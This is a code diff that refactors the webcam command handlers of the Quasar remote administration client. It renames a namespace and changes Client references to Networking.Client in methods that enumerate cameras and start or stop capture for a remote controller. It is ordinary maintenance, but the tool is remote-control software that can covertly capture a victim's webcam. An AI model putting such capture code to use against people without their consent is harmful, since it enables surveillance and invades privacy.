@@ -4,11 +4,10 @@ using System.Drawing.Imaging;
 using System.IO;
 using AForge.Video;
 using AForge.Video.DirectShow;
-using Quasar.Client.Networking;
 using Quasar.Common.Messages;
 using Quasar.Common.Video;
 
-namespace xClient.Core.Commands
+namespace Quasar.Client.Commands
 {
     /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT HANDLE WEBCAM COMMANDS. */
 
@@ -16,12 +15,12 @@ namespace xClient.Core.Commands
     {
         public static bool WebcamStarted;
         public static bool NeedsCapture;
-        public static Client Client;
+        public static Networking.Client Client;
         public static int Webcam;
         public static int Resolution;
         public static VideoCaptureDevice FinalVideo;
 
-        public static void HandleGetWebcams(GetWebcams command, Client client)
+        public static void HandleGetWebcams(GetWebcams command, Networking.Client client)
         {
             var deviceInfo = new Dictionary<string, List<Resolution>>();
             var videoCaptureDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
@@ -44,7 +43,7 @@ namespace xClient.Core.Commands
                 client.Send(new GetWebcamsResponse {Webcams = deviceInfo});
         }
 
-        public static void HandleGetWebcam(GetWebcam command, Client client)
+        public static void HandleGetWebcam(GetWebcam command, Networking.Client client)
         {
             Client = client;
             NeedsCapture = true;
@@ -61,7 +60,7 @@ namespace xClient.Core.Commands
             }
         }
 
-        public static void HandleDoWebcamStop(DoWebcamStop command, Client client)
+        public static void HandleDoWebcamStop(DoWebcamStop command, Networking.Client client)
         {
             NeedsCapture = false;
             WebcamStarted = false;
